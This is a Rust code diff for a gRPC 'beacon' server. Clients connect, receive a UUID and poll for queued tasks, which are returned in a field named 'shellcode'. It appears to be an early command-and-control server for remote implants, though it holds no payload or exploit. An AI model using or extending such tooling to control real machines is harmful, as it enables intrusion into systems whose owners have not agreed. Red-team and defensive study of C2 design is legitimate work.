@@ -1,68 +1,66 @@
 use std::collections::{HashMap, VecDeque};
-use std::pin::Pin;
 
-use futures_core::Stream;
-use tasks::PollResponse;
 use tokio::sync::RwLock;
 use tonic::{transport::Server, Request, Response, Status};
+use uuid::Uuid;
 
 use tasks::{
     beacon_service_server::{BeaconService, BeaconServiceServer},
-    ConnectionRequest, ConnectionResponse, PollRequest,
+    ConnectionRequest, ConnectionResponse, PollRequest, PollResponse,
 };
 pub mod tasks {
     tonic::include_proto!("tasks");
 }
 
-// #[derive(Hash, PartialEq, Eq, Debug, Default, Copy)]
-type ClientID = u32;
-
 type Task = String;
 
 #[derive(Debug, Default)]
 pub struct Client {
-    id: ClientID,
     tasks: VecDeque<Task>,
-}
-
-impl Client {
-    pub fn new(id: ClientID) -> Self {
-        Self {
-            id,
-            ..Default::default()
-        }
-    }
 }
 
 #[derive(Debug, Default)]
 pub struct Beacon {
-    clients: RwLock<HashMap<ClientID, Client>>,
+    clients: RwLock<HashMap<Uuid, Client>>,
 }
 
 #[tonic::async_trait]
 impl BeaconService for Beacon {
     async fn connection(
         &self,
-        request: Request<ConnectionRequest>,
+        _request: Request<ConnectionRequest>,
     ) -> Result<Response<ConnectionResponse>, Status> {
-        let conn = request.into_inner();
-        println!("Got a connection request: {}", conn.id);
+        let id = Uuid::new_v4();
 
-        self.clients
-            .write()
-            .await
-            .insert(conn.id, Client::new(conn.id));
+        println!("Got a connection request");
 
-        Ok(Response::new(ConnectionResponse {}))
+        let mut map = self.clients.write().await;
+        map.insert(id, Client::default());
+
+        Ok(Response::new(ConnectionResponse {
+            uuid: id.to_string(),
+        }))
     }
 
-    type PollStream = Pin<Box<dyn Stream<Item = Result<PollResponse, Status>> + Send + 'static>>;
+    // type PollStream = Pin<Box<dyn Stream<Item = Result<PollResponse, Status>> + Send + 'static>>;
 
-    async fn poll(
-        &self,
-        request: Request<tonic::Streaming<PollRequest>>,
-    ) -> Result<Response<Self::PollStream>, Status> {
-        unimplemented!();
+    async fn poll(&self, request: Request<PollRequest>) -> Result<Response<PollResponse>, Status> {
+        let id = Uuid::parse_str(&request.into_inner().uuid);
+        if id.is_err() {
+            return Err(Status::invalid_argument("Failed to parse uuid."));
+        }
+
+        let mut map = self.clients.write().await;
+        Ok(Response::new(PollResponse {
+            shellcode: match map.get_mut(&id.unwrap()) {
+                Some(v) => v.tasks.pop_front(),
+                None => {
+                    return Err(Status::not_found(
+                        "Client doesn't exist or isn't connected.",
+                    ))
+                }
+            },
+        }))
     }
 }
 
